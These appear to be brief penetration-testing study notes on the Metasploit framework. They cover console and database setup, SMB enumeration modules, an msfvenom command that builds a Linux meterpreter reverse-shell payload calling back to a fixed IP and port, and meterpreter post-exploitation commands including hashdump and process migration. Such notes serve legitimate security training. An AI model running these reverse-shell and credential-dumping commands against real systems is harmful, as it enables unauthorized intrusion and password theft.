msfconsole

show options
use 
set 


cd /usr/share/metasploit-framework/modules

tree -L 1 auxiliary

`smb_version`
`smb_enumshares`

`systemctl start postgresql`

`msfdb init`

`msfconsole`

`db_status`

`workspace`

`db_nmap`

msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.4.20.232 LPORT=1234 -f elf > rev_shell.elf

CTRL Z to background a session
sessions -i 1 to select number 1 in the session
sessions


modules:
post/windows/gather/enum/domain


meterpreter:
sysinfo
hashdump
search -f textfile.txt
pid
migrate

use multi/manage/shell_to_meterpreter















































